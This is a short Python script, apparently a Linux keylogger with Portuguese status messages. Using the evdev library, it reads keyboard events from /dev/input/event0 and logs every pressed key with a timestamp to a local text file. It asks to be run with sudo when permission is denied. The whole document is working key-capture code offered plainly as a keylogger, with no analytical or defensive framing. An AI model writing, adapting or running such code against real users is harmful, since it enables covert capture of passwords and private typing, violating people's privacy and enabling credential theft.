import evdev
import logging
import sys

logging.basicConfig(
    filename="keylog_linux.txt", 
    level=logging.DEBUG, 
    format='%(asctime)s: %(message)s'
)

def main():
    path = "/dev/input/event0" 
    
    print(f"[*] Linux Keylogger iniciado em: {path}")

    try:
        device = evdev.InputDevice(path)
        print(f"[+] Monitorando: {device.name}")
        
        for event in device.read_loop():
            if event.type == evdev.ecodes.EV_KEY:
                if event.value == 1: 
                    key_str = evdev.ecodes.KEY[event.code]
                    clean_key = key_str.replace("KEY_", "")
                    logging.info(clean_key)

    except FileNotFoundError:
        print(f"[-] Erro: O arquivo {path} não existe.")
    except PermissionError:
        print("\n[!] ERRO: Necessário rodar como SUDO.")
    except KeyboardInterrupt:
        print("\n[*] Encerrado.")

if __name__ == "__main__":
    main()